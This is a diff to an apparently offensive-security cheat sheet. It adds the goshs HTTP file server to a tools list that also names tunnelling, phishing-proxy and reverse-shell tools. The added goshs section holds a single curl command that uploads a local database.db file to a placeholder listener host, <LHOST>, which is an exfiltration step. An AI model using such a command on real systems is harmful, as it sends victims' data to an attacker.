@@ -44,6 +44,7 @@
 - [Gitea](#gitea)
 - [glab](#glab)
 - [Go](#go)
+- [goshs](#goshs)
 - [grep](#grep)
 - [grpc](#grpc)
 - [host](#host)
@@ -149,6 +150,7 @@
 | --- | --- | --- |
 | Chisel | A fast TCP/UDP tunnel over HTTP | https://github.com/jpillora/chisel |
 | CyberChef | The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis. | https://gchq.github.io/CyberChef |
+| goshs | A SimpleHTTPServer written in Go, enhanced with features and with a nice design | https://github.com/patrickhener/goshs |
 | MailHog | Web and API based SMTP testing | https://github.com/mailhog/MailHog |
 | Modlishka | Modlishka. Reverse Proxy. | https://github.com/drk1wi/Modlishka |
 | Reverse SSH | SSH based reverse shell | https://github.com/NHAS/reverse_ssh |
@@ -3353,6 +3355,12 @@ $ export GO111MODULE=on
 $ export GOROOT=/usr/local/go
 $ export GOPATH=$HOME/go
 $ export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
+```
+
+## goshs
+
+```c
+$ curl -F database=@./database.db -u <USERNAME>:<PASSWORD> http://<LHOST>/upload
 ```
 
 ## grep
